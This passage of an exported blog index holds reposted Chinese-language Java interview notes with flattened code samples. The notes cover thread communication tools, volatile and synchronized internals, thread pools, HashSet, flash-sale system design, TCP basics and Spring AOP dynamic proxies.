Thread(aVolatile,"thread A").start(); System.out.println("main 线程正在运行") ; TimeUnit.MILLISECONDS.sleep(100) ; aVolatile.stopThread(); &#125; private void stopThread()&#123; flag = false ; &#125;&#125; 输出结果：12345thread A正在运行。。。thread A正在运行。。。thread A正在运行。。。thread A正在运行。。。thread A执行完毕 这里的 flag 存放于主内存中，所以主线程和线程 A 都可以看到。 flag 采用 volatile 修饰主要是为了内存可见性，更多内容可以查看这里。 CountDownLatch 并发工具CountDownLatch 可以实现 join 相同的功能，但是更加的灵活。 12345678910111213141516171819202122232425private static void countDownLatch() throws Exception&#123; int thread = 3 ; long start = System.currentTimeMillis(); final CountDownLatch countDown = new CountDownLatch(thread); for (int i= 0 ;i&lt;thread ; i++)&#123; new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; Thread.sleep(2000); countDown.countDown(); LOGGER.info("thread end"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;).start(); &#125; countDown.await(); long stop = System.currentTimeMillis(); LOGGER.info("main over total time=&#123;&#125;",stop-start);&#125; 输出结果: 12345672018-03-16 20:19:44.126 [Thread-0] INFO c.c.actual.ThreadCommunication - thread run2018-03-16 20:19:44.126 [Thread-2] INFO c.c.actual.ThreadCommunication - thread run2018-03-16 20:19:44.126 [Thread-1] INFO c.c.actual.ThreadCommunication - thread run2018-03-16 20:19:46.136 [Thread-2] INFO c.c.actual.ThreadCommunication - thread end2018-03-16 20:19:46.136 [Thread-1] INFO c.c.actual.ThreadCommunication - thread end2018-03-16 20:19:46.136 [Thread-0] INFO c.c.actual.ThreadCommunication - thread end2018-03-16 20:19:46.136 [main] INFO c.c.actual.ThreadCommunication - main over total time=2012 CountDownLatch 也是基于 AQS(AbstractQueuedSynchronizer) 实现的，更多实现参考 ReentrantLock 实现原理 初始化一个 CountDownLatch 时告诉并发的线程，然后在每个线程处理完毕之后调用 countDown() 方法。 该方法会将 AQS 内置的一个 state 状态 -1 。 最终在主线程调用 await() 方法，它会阻塞直到 state == 0 的时候返回。 CyclicBarrier 并发工具123456789101112131415161718192021222324252627282930313233343536373839404142434445464748private static void cyclicBarrier() throws Exception &#123; CyclicBarrier cyclicBarrier = new CyclicBarrier(3) ; new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; cyclicBarrier.await() ; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; LOGGER.info("thread end do something"); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; cyclicBarrier.await() ; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; LOGGER.info("thread end do something"); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; Thread.sleep(5000); cyclicBarrier.await() ; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; LOGGER.info("thread end do something"); &#125; &#125;).start(); LOGGER.info("main thread");&#125; CyclicBarrier 中文名叫做屏障或者是栅栏，也可以用于线程间通信。 它可以等待 N 个线程都达到某个状态后继续运行的效果。 首先初始化线程参与者。 调用 await() 将会在所有参与者线程都调用之前等待。 直到所有参与者都调用了 await() 后，所有线程从 await() 返回继续后续逻辑。 运行结果: 12345672018-03-18 22:40:00.731 [Thread-0] INFO c.c.actual.ThreadCommunication - thread run2018-03-18 22:40:00.731 [Thread-1] INFO c.c.actual.ThreadCommunication - thread run2018-03-18 22:40:00.731 [Thread-2] INFO c.c.actual.ThreadCommunication - thread run2018-03-18 22:40:00.731 [main] INFO c.c.actual.ThreadCommunication - main thread2018-03-18 22:40:05.741 [Thread-0] INFO c.c.actual.ThreadCommunication - thread end do something2018-03-18 22:40:05.741 [Thread-1] INFO c.c.actual.ThreadCommunication - thread end do something2018-03-18 22:40:05.741 [Thread-2] INFO c.c.actual.ThreadCommunication - thread end do something 可以看出由于其中一个线程休眠了五秒，所有其余所有的线程都得等待这个线程调用 await() 。 该工具可以实现 CountDownLatch 同样的功能，但是要更加灵活。甚至可以调用 reset() 方法重置 CyclicBarrier (需要自行捕获 BrokenBarrierException 处理) 然后重新执行。 线程响应中断12345678910111213141516171819202122232425public class StopThread implements Runnable &#123; @Override public void run() &#123; while ( !Thread.currentThread().isInterrupted()) &#123; // 线程执行具体逻辑 System.out.println(Thread.currentThread().getName() + "运行中。。"); &#125; System.out.println(Thread.currentThread().getName() + "退出。。"); &#125; public static void main(String[] args) throws InterruptedException &#123; Thread thread = new Thread(new StopThread(), "thread A"); thread.start(); System.out.println("main 线程正在运行") ; TimeUnit.MILLISECONDS.sleep(10) ; thread.interrupt(); &#125;&#125; 输出结果: 123thread A运行中。。thread A运行中。。thread A退出。。 可以采用中断线程的方式来通信，调用了 thread.interrupt() 方法其实就是将 thread 中的一个标志属性置为了 true。 并不是说调用了该方法就可以中断线程，如果不对这个标志进行响应其实是没有什么作用(这里对这个标志进行了判断)。 但是如果抛出了 InterruptedException 异常，该标志就会被 JVM 重置为 false。 线程池 awaitTermination() 方法如果是用线程池来管理线程，可以使用以下方式来让主线程等待线程池中所有任务执行完毕: 1234567891011121314151617181920212223242526272829303132private static void executorService() throws Exception&#123; BlockingQueue&lt;Runnable&gt; queue = new LinkedBlockingQueue&lt;&gt;(10) ; ThreadPoolExecutor poolExecutor = new ThreadPoolExecutor(5,5,1, TimeUnit.MILLISECONDS,queue) ; poolExecutor.execute(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running"); try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;); poolExecutor.execute(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running2"); try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;); poolExecutor.shutdown(); while (!poolExecutor.awaitTermination(1,TimeUnit.SECONDS))&#123; LOGGER.info("线程还在执行。。。"); &#125; LOGGER.info("main over");&#125; 输出结果: 123452018-03-16 20:18:01.273 [pool-1-thread-2] INFO c.c.actual.ThreadCommunication - running22018-03-16 20:18:01.273 [pool-1-thread-1] INFO c.c.actual.ThreadCommunication - running2018-03-16 20:18:02.273 [main] INFO c.c.actual.ThreadCommunication - 线程还在执行。。。2018-03-16 20:18:03.278 [main] INFO c.c.actual.ThreadCommunication - 线程还在执行。。。2018-03-16 20:18:04.278 [main] INFO c.c.actual.ThreadCommunication - main over 使用这个 awaitTermination() 方法的前提需要关闭线程池，如调用了 shutdown() 方法。 调用了 shutdown() 之后线程池会停止接受新任务，并且会平滑的关闭线程池中现有的任务。 管道通信12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public static void piped() throws IOException &#123; //面向于字符 PipedInputStream 面向于字节 PipedWriter writer = new PipedWriter(); PipedReader reader = new PipedReader(); //输入输出流建立连接 writer.connect(reader); Thread t1 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running"); try &#123; for (int i = 0; i &lt; 10; i++) &#123; writer.write(i+""); Thread.sleep(10); &#125; &#125; catch (Exception e) &#123; &#125; finally &#123; try &#123; writer.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125;); Thread t2 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running2"); int msg = 0; try &#123; while ((msg = reader.read()) != -1) &#123; LOGGER.info("msg=&#123;&#125;", (char) msg); &#125; &#125; catch (Exception e) &#123; &#125; &#125; &#125;); t1.start(); t2.start();&#125; 输出结果: 1234567891011122018-03-16 19:56:43.014 [Thread-0] INFO c.c.actual.ThreadCommunication - running2018-03-16 19:56:43.014 [Thread-1] INFO c.c.actual.ThreadCommunication - running22018-03-16 19:56:43.130 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=02018-03-16 19:56:43.132 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=12018-03-16 19:56:43.132 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=22018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=32018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=42018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=52018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=62018-03-16 19:56:43.134 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=72018-03-16 19:56:43.134 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=82018-03-16 19:56:43.134 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=9 Java 虽说是基于内存通信的，但也可以使用管道通信。 需要注意的是，输入流和输出流需要首先建立连接。这样线程 B 就可以收到线程 A 发出的消息了。 实际开发中可以灵活根据需求选择最适合的线程通信方式。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Threadcore]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FThreadcore%2F</url>
    <content type="text"><![CDATA[Java 多线程三大核心原子性Java 的原子性就和数据库事物的原子性差不多，一个操作中要么全部执行成功或者失败。 JMM 只是保证了基本的原子性，但类似于 i++ 之类的操作，看似是原子操作，其实里面涉及到: 获取 i 的值。 自增。 再赋值给 i。 这三步操作，所以想要实现 i++ 这样的原子操作就需要用到 synchronize 或者是 lock 进行加锁处理。 如果是基础类的自增操作可以使用 AtomicInteger 这样的原子类来实现(其本质是利用了 CPU 级别的 的 CAS 指令来完成的)。 其中用的最多的方法就是: incrementAndGet() 以原子的方式自增。源码如下: 12345678public final long incrementAndGet() &#123; for (;;) &#123; long current = get(); long next = current + 1; if (compareAndSet(current, next)) return next; &#125; &#125; 首先是获得当前的值，然后自增 +1。接着则是最核心的 compareAndSet() 来进行原子更新。 123public final boolean compareAndSet(long expect, long update) &#123; return unsafe.compareAndSwapLong(this, valueOffset, expect, update); &#125; 其逻辑就是判断当前的值是否被更新过，是否等于 current，如果等于就说明没有更新过然后将当前的值更新为 next，如果不等于则返回false 进入循环，直到更新成功为止。 还有其中的 get() 方法也很关键，返回的是当前的值，当前值用了 volatile 关键词修饰，保证了内存可见性。 1private volatile int value; 可见性现代计算机中，由于 CPU 直接从主内存中读取数据的效率不高，所以都会对应的 CPU 高速缓存，先将主内存中的数据读取到缓存中，线程修改数据之后首先更新到缓存，之后才会更新到主内存。如果此时还没有将数据更新到主内存其他的线程此时来读取就是修改之前的数据。 如上图所示。 volatile 关键字就是用于保证内存可见性，当线程A更新了 volatile 修饰的变量时，它会立即刷新到主线程，并且将其余缓存中该变量的值清空，导致其余线程只能去主内存读取最新值。 使用 volatile 关键词修饰的变量每次读取都会得到最新的数据，不管哪个线程对这个变量的修改都会立即刷新到主内存。 synchronize和加锁也能能保证可见性，实现原理就是在释放锁之前其余线程是访问不到这个共享变量的。但是和 volatile 相比开销较大。 顺序性以下这段代码: 123int a = 100 ; //1int b = 200 ; //2int c = a + b ; //3 正常情况下的执行顺序应该是 1&gt;&gt;2&gt;&gt;3。但是有时 JVM 为了提高整体的效率会进行指令重排导致执行的顺序可能是 2&gt;&gt;1&gt;&gt;3。但是 JVM 也不能是什么都进行重排，是在保证最终结果和代码顺序执行结果一致的情况下才可能进行重排。 重排在单线程中不会出现问题，但在多线程中会出现数据不一致的问题。 Java 中可以使用 volatile 来保证顺序性，synchronize 和 lock 也可以来保证有序性，和保证原子性的方式一样，通过同一段时间只能一个线程访问来实现的。 除了通过 volatile 关键字显式的保证顺序之外， JVM 还通过 happen-before 原则来隐式的保证顺序性。 其中有一条就是适用于 volatile 关键字的，针对于 volatile 关键字的写操作肯定是在读操作之前，也就是说读取的值肯定是最新的。 volatile 的应用双重检查锁的单例模式可以用 volatile 实现一个双重检查锁的单例模式： 123456789101112131415public class Singleton&#123; private static volatile Singleton singleton ; private Singleton()&#123;&#125; public static Singleton getInstance()&#123; if(singleton == null)&#123; synchronize(Singleton.class)&#123; if(singleton == null)&#123; singleton = new Singleton(); &#125; &#125; &#125; return singleton ; &#125; &#125; 这里的 volatile 关键字主要是为了防止指令重排。如果不用 volatile ，singleton = new Singleton();，这段代码其实是分为三步： 分配内存空间。(1) 初始化对象。(2) 将 singleton 对象指向分配的内存地址。(3) 加上 volatile 是为了让以上的三步操作顺序执行，反之有可能第二步在第三步之前被执行就有可能某个线程拿到的单例对象是还没有初始化的，以致于报错。 控制停止线程的标记123456789101112private volatile boolean flag ;private void run()&#123; new Thread(new Runnable()&#123; if(flag)&#123; doSomeThing(); &#125; &#125;);&#125;private void stop()&#123; flag = false ;&#125; 这里如果没有用 volatile 来修饰 flag ，就有可能其中一个线程调用了 stop()方法修改了 flag 的值并不会立即刷新到主内存中，导致这个循环并不会立即停止。 这里主要利用的是 volatile 的内存可见性。 总结一下: volatile 关键字只能保证可见性，顺序性，不能保证原子性。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThreadPoolExecutor]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FThreadPoolExecutor%2F</url>
    <content type="text"><![CDATA[线程池原理分析首先要明确为什么要使用线程池，使用线程池会带来什么好处？ 线程是稀缺资源，不能频繁的创建。 应当将其放入一个池子中，可以给其他任务进行复用。 解耦作用，线程的创建于执行完全分开，方便维护。 创建一个线程池以一个使用较多的 1ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, RejectedExecutionHandler handler) 为例： 其中的 corePoolSize 为线程池的基本大小。 maximumPoolSize 为线程池最大线程大小。 keepAliveTime 和 unit 则是线程空闲后的存活时间。 workQueue 用于存放任务的阻塞队列。 handler 当队列和最大线程池都满了之后的饱和策略。 处理流程当提交一个任务到线程池时它的执行流程是怎样的呢？ 首先第一步会判断核心线程数有没有达到上限，如果没有则创建线程(会获取全局锁)，满了则会将任务丢进阻塞队列。 如果队列也满了则需要判断最大线程数是否达到上限，如果没有则创建线程(获取全局锁)，如果最大线程数也满了则会根据饱和策略处理。 常用的饱和策略有: 直接丢弃任务。 调用者线程处理。 丢弃队列中的最近任务，执行当前任务。 所以当线程池完成预热之后都是将任务放入队列，接着由工作线程一个个从队列里取出执行。 合理配置线程池线程池并不是配置越大越好，而是要根据任务的熟悉来进行划分：如果是 CPU 密集型任务应当分配较少的线程，比如 CPU 个数相当的大小。 如果是 IO 密集型任务，由于线程并不是一直在运行，所以可以尽可能的多配置线程，比如 CPU 个数 * 2 。 当是一个混合型任务，可以将其拆分为 CPU 密集型任务以及 IO 密集型任务，这样来分别配置。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashSet]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fcollection%2FHashSet%2F</url>
    <content type="text"><![CDATA[HashSetHashSet 是一个不允许存储重复元素的集合，它的实现比较简单，只要理解了 HashMap，HashSet 就水到渠成了。 成员变量首先了解下 HashSet 的成员变量: 1234private transient HashMap&lt;E,Object&gt; map;// Dummy value to associate with an Object in the backing Mapprivate static final Object PRESENT = new Object(); 发现主要就两个变量: map ：用于存放最终数据的。 PRESENT ：是所有写入 map 的 value 值。 构造函数1234567public HashSet() &#123; map = new HashMap&lt;&gt;();&#125;public HashSet(int initialCapacity, float loadFactor) &#123; map = new HashMap&lt;&gt;(initialCapacity, loadFactor);&#125; 构造函数很简单，利用了 HashMap 初始化了 map 。 add123public boolean add(E e) &#123; return map.put(e, PRESENT)==null;&#125; 比较关键的就是这个 add() 方法。可以看出它是将存放的对象当做了 HashMap 的健，value 都是相同的 PRESENT 。由于 HashMap 的 key 是不能重复的，所以每当有重复的值写入到 HashSet 时，value 会被覆盖，但 key 不会收到影响，这样就保证了 HashSet 中只能存放不重复的元素。 总结HashSet 的原理比较简单，几乎全部借助于 HashMap 来实现的。 所以 HashMap 会出现的问题 HashSet 依然不能避免。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spike]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSpike%2F</url>
    <content type="text"><![CDATA[设计一个秒杀系统主要做到以下两点: 尽量将请求过滤在上游。 尽可能的利用缓存(大多数场景下都是查多于写)。 常用的系统分层结构: 针对于浏览器端，可以使用 JS 进行请求过滤，比如五秒钟之类只能点一次抢购按钮，五秒钟只能允许请求一次后端服务。(APP 同理) 这样其实就可以过滤掉大部分普通用户。 但是防不住直接抓包循环调用。这种情况可以最简单的处理:在Web层通过限制一个 UID 五秒之类的请求服务层的次数(可利用 Redis 实现)。 但如果是真的有 10W 个不同的 UID 来请求，比如黑客抓肉鸡的方式。 这种情况可以在服务层 针对于写请求使用请求队列，再通过限流算法(限流算法)每秒钟放一部分请求到队列。 对于读请求则尽量使用缓存，可以提前将数据准备好，不管是 Redis 还是其他缓存中间件效率都是非常高的。 ps : 刷新缓存情况，比如库存扣除成功这种情况不用马上刷新缓存，如果库存扣到了 0 再刷新缓存。因为大多数用户都只关心是否有货，并不关心现在还剩余多少。 总结 如果流量巨大，导致各个层的压力都很大可以适当的加机器横向扩容。如果加不了机器那就只有放弃流量直接返回失败。快速失败非常重要，至少可以保证系统的可用性。 业务分批执行：对于下单、付款等操作可以异步执行提高吞吐率。 主要目的就是尽量少的请求直接访问到 DB。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP-IP]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FTCP-IP%2F</url>
    <content type="text"><![CDATA[TCP/IP 协议TCP/IP 总结起来就三个要点 三次握手的意义。 超时重发。 滑动窗口。 三次握手 如图类似： 发送者问接收者我发消息了，你收到了嘛？ 接收者回复发送者我收到了，你发消息没问题，我收消息也没问题。但我不知道我的发消息有没有问题，你收到了回复我下。 发送者告诉接收者，我收到你的消息了，你发消息没问题。通信成功我们开始工作吧！ 超时重发当发送者向接收者发包后，如果过了一段时间(超时时间)依然没有收到消息，就当做本次包丢失，需要重新补发。 并且如果一次性发了三个包，只要最后一个包确认收到之后就默认前面两个也收到了。 滑动窗口假设一次性发送包的大小为3，那么每次可以发3个包，而且可以边发边接收，这样就会增强效率。这里的 3 就是滑动窗口的大小，这样的发送方式也叫滑动窗口协议。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Synchronize]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSynchronize%2F</url>
    <content type="text"><![CDATA[Synchronize 关键字原理众所周知 Synchronize 关键字是解决并发问题常用解决方案，有以下三种使用方式: 同步普通方法，锁的是当前对象。 同步静态方法，锁的是当前 Class 对象。 同步块，锁的是 {} 中的对象。 实现原理：JVM 是通过进入、退出对象监视器( Monitor )来实现对方法、同步块的同步的。 具体实现是在编译之后在同步方法调用前加入一个 monitor.enter 指令，在退出方法和异常处插入 monitor.exit 的指令。 其本质就是对一个对象监视器( Monitor )进行获取，而这个获取过程具有排他性从而达到了同一时刻只能一个线程访问的目的。 而对于没有获取到锁的线程将会阻塞到方法入口处，直到获取锁的线程 monitor.exit 之后才能尝试继续获取锁。 流程图如下: 通过一段代码来演示: 12345public static void main(String[] args) &#123; synchronized (Synchronize.class)&#123; System.out.println("Synchronize"); &#125;&#125; 使用 javap -c Synchronize 可以查看编译之后的具体信息。 123456789101112131415161718192021222324252627282930public class com.crossoverjie.synchronize.Synchronize &#123; public com.crossoverjie.synchronize.Synchronize(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public static void main(java.lang.String[]); Code: 0: ldc #2 // class com/crossoverjie/synchronize/Synchronize 2: dup 3: astore_1 **4: monitorenter** 5: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 8: ldc #4 // String Synchronize 10: invokevirtual #5 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 13: aload_1 **14: monitorexit** 15: goto 23 18: astore_2 19: aload_1 20: monitorexit 21: aload_2 22: athrow 23: return Exception table: from to target type 5 15 18 any 18 21 18 any&#125; 可以看到在同步块的入口和出口分别有 monitorenter,monitorexit指令。 锁优化synchronize 很多都称之为重量锁，JDK1.6 中对 synchronize 进行了各种优化，为了能减少获取和释放锁带来的消耗引入了偏向锁和轻量锁。 轻量锁当代码进入同步块时，如果同步对象为无锁状态时，当前线程会在栈帧中创建一个锁记录(Lock Record)区域，同时将锁对象的对象头中 Mark Word 拷贝到锁记录中，再尝试使用 CAS 将 Mark Word 更新为指向锁记录的指针。 如果更新成功，当前线程就获得了锁。 如果更新失败 JVM 会先检查锁对象的 Mark Word 是否指向当前线程的锁记录。 如果是则说明当前线程拥有锁对象的锁，可以直接进入同步块。 不是则说明有其他线程抢占了锁，如果存在多个线程同时竞争一把锁，轻量锁就会膨胀为重量锁。 解锁轻量锁的解锁过程也是利用 CAS 来实现的，会尝试锁记录替换回锁对象的 Mark Word 。如果替换成功则说明整个同步操作完成，失败则说明有其他线程尝试获取锁，这时就会唤醒被挂起的线程(此时已经膨胀为重量锁) 轻量锁能提升性能的原因是： 认为大多数锁在整个同步周期都不存在竞争，所以使用 CAS 比使用互斥开销更少。但如果锁竞争激烈，轻量锁就不但有互斥的开销，还有 CAS 的开销，甚至比重量锁更慢。 偏向锁为了进一步的降低获取锁的代价，JDK1.6 之后还引入了偏向锁。 偏向锁的特征是:锁不存在多线程竞争，并且应由一个线程多次获得锁。 当线程访问同步块时，会使用 CAS 将线程 ID 更新到锁对象的 Mark Word 中，如果更新成功则获得偏向锁，并且之后每次进入这个对象锁相关的同步块时都不需要再次获取锁了。 释放锁当有另外一个线程获取这个锁时，持有偏向锁的线程就会释放锁，释放时会等待全局安全点(这一时刻没有字节码运行)，接着会暂停拥有偏向锁的线程，根据锁对象目前是否被锁来判定将对象头中的 Mark Word 设置为无锁或者是轻量锁状态。 偏向锁可以提高带有同步却没有竞争的程序性能，但如果程序中大多数锁都存在竞争时，那偏向锁就起不到太大作用。可以使用 -XX:-userBiasedLocking=false 来关闭偏向锁，并默认进入轻量锁。 其他优化适应性自旋在使用 CAS 时，如果操作失败，CAS 会自旋再次尝试。由于自旋是需要消耗 CPU 资源的，所以如果长期自旋就白白浪费了 CPU。JDK1.6加入了适应性自旋: 如果某个锁自旋很少成功获得，那么下一次就会减少自旋。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringAOP]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSpringAOP%2F</url>
    <content type="text"><![CDATA[Spring AOP 实现原理静态代理众所周知 Spring 的 AOP 是基于动态代理实现的，谈到动态代理就不得不提下静态代理。实现如下： 假设有一接口 InterfaceA： 123public interface InterfaceA&#123; void exec();&#125; 其中有实现类 RealImplement:12345public class RealImplement implement InterfaceA&#123; public void exec()&#123; System.out.println("real impl") ; &#125;&#125; 这时也有一个代理类 ProxyImplement 也实现了 InterfaceA:12345678910111213141516public class ProxyImplement implement InterfaceA&#123; private InterfaceA interface ; public ProxyImplement()&#123; interface = new RealImplement() ; &#125; public void exec()&#123; System.out.println("dosomethings before); //实际调用 interface.exec(); System.out.println("dosomethings after); &#125; &#125; 使用如下:123456public class Main()&#123; public static void main(String[] args)&#123; InterfaceA interface = new ProxyImplement() ; interface.exec(); &#125;&#125; 可以看出这样的代理方式调用者其实都不知道被代理对象的存在。 JDK 动态代理从静态代理中可以看出: 静态代理只能代理一个具体的类，如果要代理一个接口的多个实现的话需要定义不同的代理类。 需要解决这个问题就可以用到 JDK 的动态代理。 其中有两个非常核心的类: java.lang.reflect.Proxy类。 java.lang.reflect.InvocationHandle接口。 Proxy 类是用于创建代理对象，而 InvocationHandler 接口主要你是来处理执行逻辑。 如下：1234567891011121314151617181920212223242526272829303132333435public class CustomizeHandle implements InvocationHandler &#123; private final static Logger LOGGER = LoggerFactory.getLogger(CustomizeHandle.class); private Object target; public CustomizeHandle(Class clazz) &#123; try &#123; this.target = clazz.newInstance(); &#125; catch (InstantiationException e) &#123; LOGGER.error("InstantiationException", e); &#125; catch (IllegalAccessException e) &#123; LOGGER.error("IllegalAccessException",e); &#125; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; before(); Object result = method.invoke(target, args); after(); LOGGER.info("proxy class=&#123;&#125;", proxy.getClass()); return result; &#125; private void before() &#123; LOGGER.info("handle before"); &#125; private void after() &#123; LOGGER.info("handle after"); &#125;&#125; 其中构造方法传入被代理类的类类型。其实传代理类的实例或者是类类型并没有强制的规定，传类类型的是因为被代理对象应当有代理创建而不应该由调用方创建。 使用方式如下：123456@Testpublic void test()&#123; CustomizeHandle handle = new CustomizeHandle(ISubjectImpl.class) ; ISubject subject = (ISubject) Proxy.newProxyInstance(JDKProxyTest.class.getClassLoader(), new Class[]&#123;ISubject.class&#125;, handle); subject.execute() ;&#125; 首先传入被代理类的类类型构建代理处理器。接着使用 Proxy 的newProxyInstance 方法动态创建代理类。第一个参数为类加载器，第二个参数为代理类需要实现的接口列表，最后一个则是处理器。 其实代理类是由 这个方法动态创建出来的。将 proxyClassFile 输出到文件并进行反编译的话就可以的到代理类。1234567891011121314@Testpublic void clazzTest()&#123; byte[] proxyClassFile = ProxyGenerator.generateProxyClass( "$Proxy1", new Class[]&#123;ISubject.class&#125;, 1); try &#123; FileOutputStream out = new FileOutputStream("/Users/chenjie/Documents/$Proxy1.class") ; out.write(proxyClassFile); out.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;&#125; 反编译后结果如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import com.crossoverjie.proxy.jdk.ISubject;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.lang.reflect.UndeclaredThrowableException;public class $Proxy1 extends Proxy implements ISubject &#123; private static Method m1; private static Method m2; private static Method m3; private static Method m0; public $Proxy1(InvocationHandler var1) throws &#123; super(var1); &#125; public final boolean equals(Object var1) throws &#123; try &#123; return ((Boolean)super.h.invoke(this, m1, new Object[]&#123;var1&#125;)).booleanValue(); &#125; catch (RuntimeException | Error var3) &#123; throw var3; &#125; catch (Throwable var4) &#123; throw new UndeclaredThrowableException(var4); &#125; &#125; public final String toString() throws &#123; try &#123; return (String)super.h.invoke(this, m2, (Object[])null); &#125; catch (RuntimeException | Error var2) &#123; throw var2; &#125; catch (Throwable var3) &#123; throw new UndeclaredThrowableException(var3); &#125; &#125; public final void execute() throws &#123; try &#123; super.h.invoke(this, m3, (Object[])null); &#125; catch (RuntimeException | Error var2) &#123; throw var2; &#125; catch (Throwable var3) &#123; throw new UndeclaredThrowableException(var3); &#125; &#125; public final int hashCode() throws &#123; try &#123; return ((Integer)super.h.invoke(this, m0, (Object[])null)).intValue(); &#125; catch (RuntimeException | Error var2) &#123; throw var2; &#125; catch (Throwable var3) &#123; throw new UndeclaredThrowableException(var3); &#125; &#125; static &#123; try &#123; m1 = Class.forName("java.lang.Object").getMethod("equals", new Class[]&#123;Class.forName("java.lang.Object")&#125;); m2 = Class.forName("java.lang.Object").getMethod("toString", new Class[0]); m3 = Class.forName("com.crossoverjie.proxy.jdk.ISubject").getMethod("execute", new Class[0]); m0 = Class.forName("java.lang.Object").getMethod("hashCode", new Class[0]); &#125; catch (NoSuchMethodException var2) &#123; throw new NoSuchMethodError(var2.getMessage()); &#125; catch (ClassNotFoundException var3) &#123; throw new NoClassDefFoundError(var3.getMessage()); &#125; &#125;&#125; 可以看到代理类继承了 Proxy 类，并实现了 ISubject 接口，由此也可以看到 JDK 动态代理为什么需要实现接口，已经继承了 Proxy是不能再继承其余类了。 其中实现了 ISubject 的 execute() 方法，并通过 InvocationHandler 中的 invoke() 方法来进行调用的。 CGLIB 动态代理cglib 是对一个小而快的字节码处理框架 ASM 的封装。他的特点是继承于被代理类，这就要求被代理类不能被 final 修饰。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-optimization]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSQL-optimization%2F</url>
